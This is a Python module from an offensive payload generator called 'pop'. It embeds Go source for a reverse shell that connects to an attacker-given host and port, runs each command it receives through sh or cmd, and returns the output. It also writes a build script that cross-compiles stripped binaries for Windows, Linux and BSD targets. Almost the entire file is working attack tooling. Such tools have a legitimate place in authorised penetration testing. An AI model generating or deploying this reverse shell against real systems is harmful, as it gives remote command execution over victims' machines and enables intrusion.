#
# pop is an offensive payload generator
# Copyright 2021-2022 Philippe Grégoire <git@pgregoire.xyz>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#

import getopt
import os


TARGETS = {
    'windows': ['amd64', '386'],
    'linux': ['amd64', '386', 'arm64', 'arm'],
    'solaris': ['amd64'],
    'netbsd': ['386', 'amd64', 'arm'],
    'openbsd': ['386', 'amd64', 'arm'],
    'freebsd': ['386', 'amd64', 'arm'],
}


USAGE = 'host port os-arch'
NARGS = [3, 3]
LANG = 'go'
EXEC = ''


pl = '''
package main

import (
        "bufio"
        "fmt"
        "net"
        "os"
        "os/exec"
        "runtime"
        "strings"
)

func main() {{
    cmd := "sh";
    arg := "-c";
    if runtime.GOOS == "windows" {
        cmd = "cmd";
        arg = "/c";
    }
        conn, _ := net.Dial("tcp", "ARG1:ARG2")
        for {{
                message, _ := bufio.NewReader(conn).ReadString('\\n')
                if message == "exit\\n" {{
                        os.Exit(0);
                }}
                out, err := exec.Command(cmd, arg, strings.TrimSuffix(message, "\\n")).Output()
                if err != nil {{
                        fmt.Fprintf(conn, "%s\\n",err)
                }}
                fmt.Fprintf(conn, "%s\\n",out)
        }}
}}
'''.strip()


def g(s, args, dst, url):
    with open('{}/src.go'.format(dst), 'w') as fp:
        fp.write(s)

    # mkdir for each targets
    targs = []
    with open('{}/build.sh'.format(dst), 'w') as fp:
        fp.write('cd $(dirname -- "${0}")\n')
        for tos in TARGETS:
            for arch in TARGETS[tos]:
                fn = '{}-{}'.format(tos, arch)
                if args[2] != fn:
                    continue
                fp.write('GOOS={} GOARCH={} go build -ldflags "-w -s" -o {} src.go'.format(tos, arch, fn))
                fp.write('\n')
                targs += [fn]

    os.system('/bin/sh "{}/build.sh"'.format(dst))

    pl = ['src.go', 'build.sh'] + targs
    return '\n'.join([url + e for e in pl])
